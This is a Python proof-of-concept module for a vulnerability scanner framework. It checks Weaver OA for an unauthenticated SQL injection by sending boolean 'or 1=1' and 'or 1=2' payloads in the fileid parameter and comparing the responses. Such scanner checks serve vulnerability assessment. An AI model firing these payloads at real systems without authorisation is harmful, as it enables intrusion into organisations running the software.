# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '3a60f42b-9a9a-46a7-bf51-14f933cd76d2'
    name = '泛微某系统通用型SQL注入(无需登录)' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-17'  # 漏洞公布时间
    desc = '''
        泛微某系统通用型SQL注入，无需登录直接注入 /weaver/weaver.email.FileDownloadLocation?download=1&fileid=
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=76418
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1f0470ba-fd1f-483a-94d9-4d00749e15b1'
    author = '国光'  # POC编写者
    create_date = '2018-05-12' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            true_url ='{target}'.format(target=self.target) + '/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=1'
            false_url ='{target}'.format(target=self.target) + '/weaver/weaver.email.FileDownloadLocation?download=1&fileid=-2%20or%201=2'

            code1, head1,res1, errcode1, _ = hh.http(true_url)
            code2, head2,res2, errcode2, _ = hh.http(false_url)
            
            if 'attachment' in head1 and  'attachment' not in head2:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()